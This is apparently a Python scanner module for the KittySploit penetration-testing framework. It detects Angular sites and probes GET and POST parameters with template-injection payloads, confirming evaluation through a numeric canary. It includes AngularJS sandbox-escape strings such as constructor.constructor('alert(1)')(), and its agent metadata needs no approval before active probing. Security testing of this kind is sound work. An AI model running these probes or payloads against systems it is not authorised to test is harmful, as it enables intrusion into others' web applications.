#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import re
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client


# Unique product unlikely to appear on normal pages (avoids "49" / year false positives).
_EVAL_A, _EVAL_B = 1337, 7331
_EVAL_RESULT = str(_EVAL_A * _EVAL_B)  # 9801547
_MATH_PAYLOAD = f"{{{{{_EVAL_A}*{_EVAL_B}}}}}"

_ANGULAR_INDICATORS = (
    "ng-app",
    "ng-controller",
    "ng-version",
    "angular.js",
    "angular.min.js",
    "angularjs",
    "[ng-",
    "*ng-",
    "ng-bind",
    "ng-model",
)


class Module(Auxiliary, Http_client):

    __info__ = {
        "name": "Angular XSS Scanner",
        "description": (
            "Scans for Angular-specific XSS / template expression injection. "
            "Requires Angular indicators and confirmed expression evaluation "
            "(reflection alone is not treated as a finding)."
        ),
        "author": "KittySploit Team",
        "tags": ["web", "angular", "xss", "scanner", "security", "injection"],
        "references": [
            "https://owasp.org/www-community/attacks/xss/",
            "https://angular.io/guide/security",
            "https://portswigger.net/web-security/cross-site-scripting",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints", "params"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["angular", "angularjs"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [{"capability": "endpoints", "from_detail": ""}],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    # Probe payloads: math canary first; constructor probes only count on evaluation.
    ANGULAR_PAYLOADS = [
        _MATH_PAYLOAD,
        '{{constructor.constructor("return 1+1")()}}',
        '{{$eval.constructor("return 1+1")()}}',
        '{{constructor.constructor("alert(1)")()}}',
        '{{$on.constructor("alert(1)")()}}',
        '{{$watch.constructor("alert(1)")()}}',
        '{{constructor["constructor"]("alert(1)")()}}',
    ]

    ANGULAR_PARAMS = [
        "q",
        "query",
        "search",
        "filter",
        "sort",
        "order",
        "name",
        "value",
        "id",
        "key",
        "template",
        "expression",
        "callback",
    ]

    force_scan = OptBool(
        False,
        "Run even when Angular is not detected on the target",
        required=False,
    )

    def check(self):
        try:
            response = self.http_request(method="GET", path="/")
            if not response:
                return False
            if self._body_has_angular(response.text or "", response.headers):
                return True
            return bool(self.force_scan)
        except Exception:
            return False

    def _body_has_angular(self, content: str, headers: Any = None) -> bool:
        low = (content or "").lower()
        if any(token in low for token in _ANGULAR_INDICATORS):
            return True
        header_blob = str(headers or "").lower()
        return "angular" in header_blob

    def detect_angular_version(self) -> Optional[str]:
        try:
            response = self.http_request(method="GET", path="/")
            if not response:
                return None

            content = response.text or ""
            version_match = re.search(
                r"angular[\.-]?(\d+\.\d+\.\d+)", content, re.IGNORECASE
            )
            if version_match:
                return version_match.group(1)

            ng_version_match = re.search(
                r'ng-version=["\']([^"\']+)["\']', content, re.IGNORECASE
            )
            if ng_version_match:
                return ng_version_match.group(1)

            low = content.lower()
            if "angularjs" in low or "ng-app" in low:
                return "AngularJS (1.x)"
            if "angular" in low and ("[ng-" in content or "*ng-" in content):
                return "Angular 2+"
            if self._body_has_angular(content, response.headers):
                return "Angular (unversioned)"
            return None
        except Exception as exc:
            print_debug(f"Error detecting Angular version: {exc}")
            return None

    def _baseline_body(self, param_name: str, method: str = "GET") -> str:
        canary = "kittysploit_angular_baseline"
        try:
            if method.upper() == "POST":
                response = self.http_request(
                    method="POST",
                    path="/",
                    data={param_name: canary},
                )
            else:
                response = self.http_request(
                    method="GET",
                    path=f"/?{param_name}={canary}",
                    allow_redirects=False,
                )
            return (response.text or "") if response else ""
        except Exception:
            return ""

    def _expression_evaluated(
        self,
        payload: str,
        body: str,
        baseline: str,
    ) -> Tuple[bool, str]:
        """Return (evaluated, reason). Reflection of the raw payload is never enough."""
        if not body:
            return False, ""

        # Math canary: result must appear, not be present in baseline, and
        # raw template markers for that expression should be gone or rewritten.
        expr_match = re.search(r"\{\{(\d+)\*(\d+)\}\}", payload)
        if expr_match:
            expected = str(int(expr_match.group(1)) * int(expr_match.group(2)))
            if expected in baseline:
                return False, ""
            if expected not in body:
                return False, ""
            # If the full payload is still reflected unchanged, it was not evaluated.
            if payload in body:
                return False, ""
            encoded = urllib.parse.quote(payload)
            if encoded in body:
                return False, ""
            return True, f"expression_evaluated:{expected}"

        # Constructor / $eval probes: require a clear evaluation side-effect.
        # Alert payloads cannot be confirmed server-side from HTML alone; skip
        # unless a distinct numeric canary was returned (handled above).
        if "constructor" in payload or "$eval" in payload:
            # Soft signal only when Angular-like sandbox error / eval residue appears
            # without reflecting the full raw payload (common with AngularJS CSTI).
            if payload in body:
                return False, ""
            residues = (
                "constructor is not defined",
                "[object Object]",
                "ReferenceError",
            )
            hit = next((item for item in residues if item in body and item not in baseline), None)
            if hit:
                return True, f"angular_eval_residue:{hit}"
        return False, ""

    def test_xss_payload(
        self,
        payload: str,
        param_name: str = "q",
        *,
        baseline: str = "",
        method: str = "GET",
    ) -> Dict[str, Any]:
        try:
            if method.upper() == "POST":
                response = self.http_request(
                    method="POST",
                    path="/",
                    data={param_name: payload},
                )
                test_path = "/"
            else:
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False,
                )

            if not response:
                return {
                    "payload": payload,
                    "param": param_name,
                    "method": method.upper(),
                    "vulnerable": False,
                    "error": "No response",
                }

            body = response.text or ""
            is_reflected = payload in body or urllib.parse.quote(payload) in body
            is_evaluated, reason = self._expression_evaluated(payload, body, baseline)
            # Reflection alone is a false positive for Angular CSTI / XSS.
            vulnerable = bool(is_evaluated)

            return {
                "payload": payload,
                "param": param_name,
                "path": test_path,
                "method": method.upper(),
                "vulnerable": vulnerable,
                "is_reflected": is_reflected,
                "is_evaluated": is_evaluated,
                "evidence": reason,
                "status_code": response.status_code,
                "response_length": len(body),
            }
        except Exception as exc:
            return {
                "payload": payload,
                "param": param_name,
                "method": method.upper(),
                "vulnerable": False,
                "error": str(exc),
            }

    def run(self):
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.test_results: List[Dict[str, Any]] = []

        print_status("Starting Angular XSS scan...")
        print_info(f"Target: {self.target}")
        print_info("")

        print_status("Detecting Angular version...")
        version = self.detect_angular_version()
        angular_present = bool(version)
        if not angular_present:
            # Re-check body indicators without a version string.
            probe = self.http_request(method="GET", path="/")
            angular_present = bool(
                probe and self._body_has_angular(probe.text or "", probe.headers)
            )

        if version:
            print_success(f"Angular version detected: {version}")
        elif angular_present:
            print_success("Angular indicators detected (version unknown)")
        else:
            print_warning("Angular not detected")
            if not self.force_scan:
                print_info(
                    "Skipping Angular XSS probes (reflection without Angular "
                    "is not a vulnerability). Set force_scan=true to override."
                )
                print_info("No Angular XSS vulnerabilities detected.")
                return True
            print_info("force_scan enabled — continuing without Angular confirmation")
        print_info("")

        print_status("Testing GET parameters for Angular expression injection...")
        print_info("")

        for param in self.ANGULAR_PARAMS:
            print_info(f"Testing parameter: {param}")
            baseline = self._baseline_body(param, "GET")
            for payload in self.ANGULAR_PAYLOADS:
                result = self.test_xss_payload(
                    payload, param, baseline=baseline, method="GET"
                )
                self.test_results.append(result)
                if result.get("vulnerable"):
                    print_success(
                        f"  [!] Confirmed expression evaluation with payload: {payload[:50]}..."
                    )
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Evidence: {result.get('evidence', '')}")
                    self.vulnerabilities.append(result)

        print_info("")
        print_status("Testing POST parameters for Angular expression injection...")
        print_info("")

        for param in self.ANGULAR_PARAMS[:5]:
            print_info(f"Testing POST parameter: {param}")
            baseline = self._baseline_body(param, "POST")
            for payload in self.ANGULAR_PAYLOADS[:3]:
                result = self.test_xss_payload(
                    payload, param, baseline=baseline, method="POST"
                )
                self.test_results.append(result)
                if result.get("vulnerable"):
                    print_success(
                        f"  [!] Confirmed expression evaluation (POST): {payload[:50]}..."
                    )
                    print_info(f"      Parameter: {param}")
                    self.vulnerabilities.append(result)

        print_info("")
        print_status("=" * 60)
        print_status("Angular XSS Scan Summary")
        print_status("=" * 60)

        if version:
            print_info(f"Angular Version: {version}")
        elif angular_present:
            print_info("Angular Version: detected (unversioned)")
        else:
            print_warning("Angular Version: Not detected")

        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")

        if self.vulnerabilities:
            print_success("Confirmed Angular expression injection:")
            print_info("")
            table_data = []
            for vuln in self.vulnerabilities[:20]:
                payload_short = vuln["payload"][:40] + (
                    "..." if len(vuln["payload"]) > 40 else ""
                )
                table_data.append(
                    [
                        vuln.get("param", "N/A"),
                        vuln.get("method", "GET"),
                        payload_short,
                        vuln.get("evidence") or "evaluated",
                    ]
                )
            print_table(["Parameter", "Method", "Payload", "Evidence"], table_data)
        else:
            print_info("No Angular XSS vulnerabilities detected.")

        return True
